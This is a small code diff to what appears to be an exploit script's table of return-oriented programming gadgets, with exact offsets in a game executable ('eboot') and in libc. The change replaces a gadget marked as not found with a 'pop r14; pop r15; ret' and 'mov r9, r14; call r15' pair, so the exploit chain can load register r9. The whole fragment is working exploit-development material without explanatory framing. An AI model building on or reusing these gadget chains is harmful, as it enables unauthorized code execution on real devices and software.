@@ -51,7 +51,7 @@ GADGET_OFFSETS = {
             "pop rsi; ret": 0x83F82,
             "pop rdi; ret": 0x2FC0FD,
             "pop r8; ret": 0x804111,
-            "pop r9; ret 0xc25a": 0xA634E7 - 0x3990,  # NOT FOUND in eboot
+            "pop r14; pop r15; ret": 0x3A5193,
             "mov [rsi], rax; ret": 0x7FE05A,
             "mov rsp, rbp; pop rbp; ret": 0x114,
             "push rbp; mov rbp, rsp; xor esi, esi; call [rdi + 0x130]": 0x38BC50,
@@ -61,6 +61,7 @@ GADGET_OFFSETS = {
             # libc
             "mov rsp, [rdi + 0x38]; pop rdi; ret": 0x3EB7E,
             "mov rax, [rax]; ret": 0x700D7,
+            "mov r9, r14; call r15": 0x36387,
         },
     },
 }
@@ -68,6 +69,7 @@ GADGET_OFFSETS = {
 LIBC_GADGETS = [
     "mov rsp, [rdi + 0x38]; pop rdi; ret",
     "mov rax, [rax]; ret",
+    "mov r9, r14; call r15",
 ]
 
 LIBC_OFFSETS = {
